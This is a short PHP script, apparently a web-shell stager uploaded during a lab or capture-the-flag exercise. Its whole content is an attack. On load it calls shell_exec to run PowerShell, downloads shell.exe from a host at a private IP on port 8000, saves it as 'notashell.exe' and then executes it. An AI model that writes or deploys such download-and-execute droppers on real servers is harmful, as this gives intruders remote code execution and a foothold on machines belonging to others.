<?php
  function get_stager() {
    $init = "powershell.exe";
    $payload = "Invoke-WebRequest 10.50.103.142:8000/shell.exe -outfile notashell.exe"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
  }
 function execute_stager() {
  $init = "powershell.exe";
    $payload = ".\notashell.exe"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
 }
  get_stager();
  execute_stager();
  die();
?>
